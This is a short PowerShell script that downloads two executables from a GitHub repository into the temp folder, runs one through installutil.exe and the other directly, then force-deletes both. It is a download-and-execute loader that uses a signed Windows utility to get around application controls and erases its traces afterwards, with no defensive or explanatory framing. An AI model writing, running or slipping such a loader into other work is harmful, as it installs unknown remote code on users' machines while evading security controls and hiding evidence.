# Define the URLs of the files to download
$file1Url = "https://github.com/sasa00elsaedy/funny_scripts/raw/refs/heads/main/doctor_2.exe"
$file2Url = "https://github.com/sasa00elsaedy/funny_scripts/raw/refs/heads/main/doctor.exe"

# Define the path to the temporary directory
$tempDir = [System.IO.Path]::GetTempPath()

# Define the file names
$file1 = Join-Path $tempDir "doctor_2.exe"
$file2 = Join-Path $tempDir "doctor.exe"

# Download the files
Invoke-WebRequest -Uri $file1Url -OutFile $file1
Invoke-WebRequest -Uri $file2Url -OutFile $file2

# Run the first file using installutil.exe
& "C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe" $file1

# Run the second file
& $file2

# Remove the downloaded files
Remove-Item $file1, $file2 -Force
